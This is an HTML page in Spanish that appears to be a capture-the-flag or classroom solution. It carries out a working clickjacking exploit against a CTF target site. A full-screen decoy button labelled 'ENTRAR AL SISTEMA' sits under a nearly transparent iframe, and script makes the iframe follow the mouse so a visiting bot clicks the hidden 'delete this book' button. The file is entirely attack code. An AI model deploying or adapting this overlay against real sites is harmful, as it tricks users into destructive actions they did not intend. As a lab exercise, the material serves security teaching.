<!DOCTYPE html>
<html>
<head>
    <title>Exploit Clickjacking Dinámico</title>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }

        /* EL BOTÓN CEBO (Capa inferior) */
        #objetivo {
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            z-index: 1; /* ABAJO */
            background: white;
            border: none;
            cursor: pointer;
        }

        /* EL CONTENEDOR DEL IFRAME (Capa superior) */
        #contenedor-victima {
            position: absolute;
            width: 100px;  /* Tamaño pequeño para centrar el clic */
            height: 50px;
            z-index: 999;  /* ARRIBA */
            opacity: 0.1;  /* Opacidad sugerida por el docente */
            pointer-events: auto;
            overflow: hidden;
        }

        iframe {
            position: absolute;
            /* Ajuste: Movemos el contenido del iframe para que 
               el botón "Borrar este libro" esté en el (0,0) del contenedor */
            top: -910px; 
            left: -50px;
            width: 1200px;
            height: 2000px;
            border: none;
        }
    </style>
</head>
<body>

    <button id="objetivo">ENTRAR AL SISTEMA</button>

    <div id="contenedor-victima">
        <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
    </div>

    <script>
        const contenedor = document.getElementById('contenedor-victima');
        
        // El iframe se mueve siguiendo al ratón del bot
        window.addEventListener('mousemove', (e) => {
            contenedor.style.left = (e.pageX - 50) + 'px';
            contenedor.style.top = (e.pageY - 25) + 'px';
        });

        // Doble clic: Si hay una confirmación "estás seguro", 
        // el bot suele clicar varias veces o moverse.
    </script>
</body>
</html>
